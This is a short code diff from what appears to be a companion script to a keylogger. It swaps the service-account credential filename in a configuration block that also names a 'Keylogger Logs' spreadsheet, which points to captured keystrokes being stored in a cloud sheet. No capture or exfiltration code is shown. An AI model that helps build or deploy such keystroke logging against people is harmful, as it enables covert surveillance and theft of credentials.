@@ -49,7 +49,7 @@ except Exception:  # fallback if TextBlob isn't installed
 # ─────────────────────────────────────────────
 # Configuration  (mirrors keylogger.py settings)
 # ─────────────────────────────────────────────
-SERVICE_ACCOUNT_FILE = "keylogger-database-13f0c3b13a4e.json"
+SERVICE_ACCOUNT_FILE = "keylogger-database-47998067cfaa.json"
 SPREADSHEET_NAME     = "Keylogger Logs"
 
 SCOPES = [
